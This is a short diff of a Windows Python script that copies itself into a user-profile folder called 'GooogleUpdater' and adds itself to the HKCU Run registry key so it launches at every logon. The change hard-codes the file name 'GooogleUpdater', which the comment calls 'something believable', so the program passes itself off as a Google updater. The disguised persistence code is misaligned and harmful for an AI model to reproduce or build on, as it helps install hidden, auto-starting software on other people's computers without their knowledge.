@@ -16,7 +16,7 @@ doing, that is.
 import os
 import time
 import random
-import winreg
+import winreg as reg
 import sys
 
 userPath = os.path.join(os.path.expandvars("%userprofile%"),"GooogleUpdater") #Setting custom path to a folder in User's folder
@@ -26,7 +26,7 @@ def addStartup():
 	else:
 		os.mkdir(userPath) #Creating the directory for future checking and wallpaper storage
 		fp = os.path.dirname(os.path.realpath(__file__)) #Getting the real path to the current script
-		file_name = sys.argv[0].split('\\')[-1] #Formatting the path to get the filename
+		file_name = "GooogleUpdater" #Setting the file name to something believable
 		new_file_path = fp + '\\' + file_name #Generating new file path
 		keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run' #2nd half of registry key in Registry Editor (Can be changed to RunOnce)
 		key2change = reg.OpenKey(reg.HKEY_CURRENT_USER, keyVal, 0, reg.KEY_ALL_ACCESS) #Adding keys with 1st and 2nd halves of the registry
